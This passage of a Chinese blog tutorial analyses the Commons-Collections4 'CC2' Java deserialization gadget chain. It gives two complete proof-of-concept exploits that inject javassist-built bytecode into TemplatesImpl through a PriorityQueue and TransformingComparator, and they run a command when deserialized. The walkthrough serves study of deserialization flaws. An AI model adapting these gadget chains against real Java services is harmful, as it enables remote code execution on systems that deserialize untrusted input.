class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line"></span><br><span class="line">        ClassPool classPool=ClassPool.getDefault();<span class="comment">//返回默认的类池</span></span><br><span class="line">        classPool.appendClassPath(AbstractTranslet);<span class="comment">//添加AbstractTranslet的搜索路径</span></span><br><span class="line">        CtClass payload=classPool.makeClass(<span class="string">&quot;CommonsCollections22222222222&quot;</span>);<span class="comment">//创建一个新的public类</span></span><br><span class="line"></span><br><span class="line">        payload.setSuperclass(classPool.get(AbstractTranslet));  <span class="comment">//设置前面创建的CommonsCollections22222222222类的父类为AbstractTranslet</span></span><br><span class="line">        payload.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>); <span class="comment">//创建一个空的类初始化，设置构造函数主体为runtime</span></span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes=payload.toBytecode();<span class="comment">//转换为byte数组</span></span><br><span class="line"></span><br><span class="line">        Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;).newInstance();<span class="comment">//反射创建TemplatesImpl</span></span><br><span class="line">        Field field=templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);<span class="comment">//反射获取templatesImpl的_bytecodes字段</span></span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);<span class="comment">//暴力反射</span></span><br><span class="line">        field.set(templatesImpl,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);<span class="comment">//将templatesImpl上的_bytecodes字段设置为runtime的byte数组</span></span><br><span class="line"></span><br><span class="line">        Field field1=templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);<span class="comment">//反射获取templatesImpl的_name字段</span></span><br><span class="line">        field1.setAccessible(<span class="literal">true</span>);<span class="comment">//暴力反射</span></span><br><span class="line">        field1.set(templatesImpl,<span class="string">&quot;test&quot;</span>);<span class="comment">//将templatesImpl上的_name字段设置为test</span></span><br><span class="line"></span><br><span class="line">        InvokerTransformer transformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer);<span class="comment">//使用TransformingComparator修饰器传入transformer对象</span></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);<span class="comment">//使用指定的初始容量创建一个 PriorityQueue，并根据其自然顺序对元素进行排序。</span></span><br><span class="line">        queue.add(<span class="number">1</span>);<span class="comment">//添加数字1插入此优先级队列</span></span><br><span class="line">        queue.add(<span class="number">1</span>);<span class="comment">//添加数字1插入此优先级队列</span></span><br><span class="line">        Field field2=queue.getClass().getDeclaredField(<span class="string">&quot;comparator&quot;</span>);<span class="comment">//获取PriorityQueue的comparator字段</span></span><br><span class="line">        field2.setAccessible(<span class="literal">true</span>);<span class="comment">//暴力反射</span></span><br><span class="line">        field2.set(queue,comparator);<span class="comment">//设置queue的comparator字段值为comparator</span></span><br><span class="line"></span><br><span class="line">        Field field3=queue.getClass().getDeclaredField(<span class="string">&quot;queue&quot;</span>);<span class="comment">//获取queue的queue字段</span></span><br><span class="line">        field3.setAccessible(<span class="literal">true</span>);<span class="comment">//暴力反射</span></span><br><span class="line">        field3.set(queue,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImpl,templatesImpl&#125;);<span class="comment">//设置queue的queue字段内容Object数组，内容为templatesImpl</span></span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;test.out&quot;</span>));</span><br><span class="line">        outputStream.writeObject(queue);</span><br><span class="line">        outputStream.close();</span><br><span class="line"></span><br><span class="line">        ObjectInputStream inputStream=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;test.out&quot;</span>));</span><br><span class="line">        inputStream.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个POC是没问题的</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/66630a0324c69.png" alt="image-20240604193233796"></p>
+<p>我们重新分析一下吧 虽然思路差不多</p>
+<p>这条链子和CC2进化之前的链子有很多地方都是一样的，不过这里 RCE 的方法是利用 <strong>javassist</strong> 中的字节码编程获取到字节码，然后再利用 <strong>TemplatesImpl</strong> 中的 <strong>defineTransletClasses</strong> 方法把字节码加载到 JVM 中运行</p>
+<h4 id="链子分析"><a href="#链子分析" class="headerlink" title="链子分析"></a>链子分析</h4><p>从 POC 入手</p>
+<p>推反序列化链，<code>readObject</code> 到 <code>siftDownUsingComparator</code> 这一段都是一样的，不过要重新分析一下 <strong>siftDownUsingComparator</strong> 利用的过程</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/666309ff551a2.png" alt="image-20240604194627498"></p>
+<p>可以看到在 POC 中通过反射给 <strong>queue 实例</strong>中的 <strong>queue 属性</strong> set 成了我们的恶意类</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/666309ff2dece.png" alt="image-20240604195341442"></p>
+<p>我们回头看<code>siftDownUsingComparator</code></p>
+<p>传进这个方法的 k 值为 0，x 值为 queue [0]</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/66630a005f046.png" alt="image-20240604200106932"></p>
+<p>下面有一个 &amp;&amp; 短路</p>
+<p>因为 child 为 (k&lt;&lt;1)+1, 所以值为 2, 又因为 size 也为 2，所以你看这里</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/666309ff6a009.png" alt="image-20240604200348594"></p>
+<p>即使我们的 c 值，queue [right] 值存在着我们的恶意类，因为 right&#x3D;&#x3D;size&#x3D;2, 所以在这个逻辑中前面就已经为 false 了，所以<strong>后面的 compare 方法是不会执行的</strong>。</p>
+<p>我们其实执行的 compare 方法是在下一个 if 语句</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/666309ff35ca3.png" alt="image-20240604200809671"></p>
+<p>我们的debug中也有所体现</p>
+<p>所以 我们的 queue [0] 中必须放着我们的恶意类，其他的放不放无所谓 (即使 c 也可以传进去)</p>
+<p>我们在回头看<code>TransformingComparator.compare</code></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/666309ff29cb2.png" alt="image-20240604201700334"></p>
+<p>我们传入的 x 即 queue [0] 是被先执行的，所以如果 queue [0] 中不存在我们的恶意类，后面的 <strong>InvokerTransformer</strong> 就无法执行 <strong>newTransformer</strong> 方法，就会直接抛出错误中断运行 </p>
+<p>至于为什么是数组，因为 queue 是数组嘛</p>
+<p>这也是为什么必须放着我们的恶意类的原因</p>
+<p>好</p>
+<p>然后就是TemplatesImpl加载字节码了</p>
+<p>这里就不索了</p>
+<p>这里是用了javassist动态构造了我们恶意类的字节码，当然也可以直接编译成class文件，然后用二进制字节码来存储</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/666309ff676d5.png" alt="image-20240604203301928"></p>
+<p>这里是用ClassPool 和CtClass来生成恶意类的字节码</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/66630a01017a8.png" alt="image-20240604203450335"></p>
+<p>我们反射创建TemplatesImpl类，这没什么好说的，反射获取到了TemplatesImpl.instance对象作为TemplatesImpl类的实例化</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/666309ff666ae.png" alt="image-20240604203807980"></p>
+<p>通过Field来获取_bytecodes属性，这里调用的getDeclaredField()方法，并设置setAccessible(true);能获取到所有属性包括Privatie的</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/66630a0156e78.png" alt="image-20240604204708784"></p>
+<p>获取到_bytecodes属性后把我们生成的恶意类字节码bytes给set赋值到里面去</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/666309ff419b5.png" alt="image-20240604204755288"></p>
+<p>想调用到defineTransletClasses()方法就要保证 <strong>_name不为空</strong>,getTransletInstance()用defineTransletClasses()来加载字节码生成类</p>
+<p>并且下面语句实例化恶意类</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet) _class[_transletIndex].newInstance();</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/66630a0154b65.png" alt="image-20240604205832076"></p>
+<p>getTransletInstance()会去调用defineTransletClasses()，又会继续调用ClassLoader的defineClass来加载我们的字节码（这到ClassLoader已经底层类加载了）来生成恶意类</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">loader.defineClass(_bytecodes[i]);</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/66630a00b5f57.png" alt="image-20240604210134421"></p>
+<p>所以接下来的poc是设置_name为我们的恶意类名，保证它不为空</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/666309ff6a009.png" alt="image-20240604210429456"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/66630a0066009.png" alt="image-20240604210414083"></p>
+<p>通过结构 找到了在TemplatesImpl类中有一个new TransformerImpl()方法内部调用了getTransletInstance()方法能成功调用</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/666309ffbbbd8.png" alt="image-20240604211038778"></p>
+<p>那么再来看看这个newTransformerImpl()方法是什么</p>
+<p>它会返回一个<strong>transformer</strong></p>
+<p>然后就是我们的<code>InvokerTransformer</code>类的<code>transform()</code>方法来调用new TransformerImpl()方法</p>
+<p>再就是我们前面所提到的PriorityQueue集合了！</p>
+<p>该队列的comparator属性我们可以指定成TransformingComparator比较器的，这样就可以调用TransformingComparator的compare()方法了</p>
+<p>并且把比较对象设置成TemplatesImpl类的对象</p>
+<p>因此我们只需要在PriorityQueue集合中添加两个TemplatesImpl对象作为集合元素就可以触发之前构造的利用链。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/66630a0017ed2.png" alt="image-20240604211509209"></p>
+<p>当然 是先实例化一个PrioritQueue对象，我们可控comparator属性，填入的两个元素</p>
+<p>然后设置comparator的属性，通过Field获取到对应的属性，然后传入comparator和queue属性</p>
+<p>注意这里因为是比较队列至少需要两个元素，所以我们传入两个TemplatesImpl_instance对象</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/66630a005d710.png" alt="image-20240604211658969"></p>
+<p>接下来就是熟悉的序列化再反序列化出来了也就是模拟一边数据传输流了</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/666309ffd2e64.png" alt="image-20240604211726045"></p>
+<p>分析就差不多这样</p>
+<p>可能这个POC更好理解一点</p>
+<p>注释不那辣莫多 更清晰一点</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//构造恶意类TestTemplatesImpl并转换为字节码</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.getCtClass(<span class="string">&quot;cc2.TestTemplatesImpl&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">        System.out.println(bytes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反射创建TemplatesImpl</span></span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor = aClass.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">TemplatesImpl_instance</span> <span class="operator">=</span> constructor.newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将恶意类的字节码设置给_bytecodes属性</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(TemplatesImpl_instance, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置属性_name为恶意类名</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(TemplatesImpl_instance, <span class="string">&quot;TestTemplatesImpl&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//构造利用链</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformer_comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//触发漏洞</span></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置comparator属性</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> queue.getClass().getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(queue, transformer_comparator);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置queue属性</span></span><br><span class="line">        field = queue.getClass().getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//队列至少需要2个元素</span></span><br><span class="line">        Object[] objects = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;TemplatesImpl_instance, TemplatesImpl_instance&#125;;</span><br><span class="line">        field.set(queue, objects);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化 ---&gt; 反序列化</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>注意：</p>
+<p>PriorityQueue的利用链是否支持在Commons-Collections&#x3D;3中使⽤</p>
+<p>当然不行因为这条利用链中的关键类 <code>org.apache.commons.collections4.comparators.TransformingComparator</code> ，在Commons-Collections&#x3D;4.0以前是版本中是<strong>没有实现 Serializable 接口的</strong></p>
+</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">VVkladg0r</div><div class="post-copyright__author_desc"></div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://cszvvds.cc/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC2/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://cszvvds.cc/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC2/')">java反序列化--CC2</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"><div class="post-reward" onclick="anzhiyu.addRewardMask()"><div class="reward-button button--animated" title="赞赏作者"><i class="anzhiyufont anzhiyu-icon-hand-heart-fill"></i>打赏作者</div><div class="reward-main"><div class="reward-all"><span class="reward-title">感谢你赐予我前进的力量</span><ul class="reward-group"><li class="reward-item"><a href="https://bu.dusays.com/2024/05/13/6640eacb0aad7.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6640eacb0aad7.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://bu.dusays.com/2024/05/13/6640eacae5439.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6640eacae5439.png" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul><a class="reward-main-btn" href="/about/#about-reward" target="_blank"><div class="reward-text">赞赏者名单</div><div class="reward-dec">因为你们的支持让我意识到写文章的价值🙏</div></a></div></div></div><div id="quit-box" onclick="anzhiyu.removeRewardMask()" style="display: none"></div></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://cszvvds.cc/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC2/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=java反序列化--CC2&amp;url=http://cszvvds.cc/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC2/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
+  var currentPageUrl = window.location.href;
+  var input = document.createElement("input");
+  input.setAttribute("value", currentPageUrl);
+  document.body.appendChild(input);
+  input.select();
+  input.setSelectionRange(0, 99999);
+  document.execCommand("copy");
+  document.body.removeChild(input);
+}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://cszvvds.cc" target="_blank">VV</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/java%E5%AE%89%E5%85%A8/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>java安全<span class="tagsPageCount">12</span></a><a class="post-meta__box__tags" href="/tags/java/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>java<span class="tagsPageCount">12</span></a><a class="post-meta__box__tags" href="/tags/%E5%AD%A6%E4%B9%A0/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>学习<span class="tagsPageCount">12</span></a><a class="post-meta__box__tags" href="/tags/CC%E9%93%BE/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>CC链<span class="tagsPageCount">7</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC1/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">java反序列化--CC1</div></div></a></div><div class="next-post pull-right"><a href="/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC3/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">java反序列化--CC3</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC1/" title="java反序列化--CC1"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-07</div><div class="title">java反序列化--CC1</div></div></a></div><div><a href="/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC5/" title="java反序列化--CC5"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-07</div><div class="title">java反序列化--CC5</div></div></a></div><div><a href="/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC4/" title="java反序列化--CC4"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-07</div><div class="title">java反序列化--CC4</div></div></a></div><div><a 